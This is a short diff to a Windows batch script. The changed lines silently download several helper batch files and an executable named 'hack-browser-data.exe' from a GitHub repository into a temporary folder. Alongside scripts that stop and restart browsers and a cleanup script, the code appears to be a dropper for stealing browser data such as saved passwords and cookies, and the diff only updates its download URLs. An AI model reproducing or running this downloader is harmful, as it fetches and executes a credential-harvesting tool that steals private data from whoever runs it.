@@ -7,10 +7,10 @@ mkdir "%tempdir%" 2>nul
 cd "%tempdir%"
 
 echo Downloading files...
-curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
-curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
-curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
-curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
+curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/process.bat
+curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/stop_browsers.bat
+curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/start_browsers.bat
+curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/hack-browser-data.exe
 
 REM Create the cleanup script
 echo @echo off > cleanup.bat
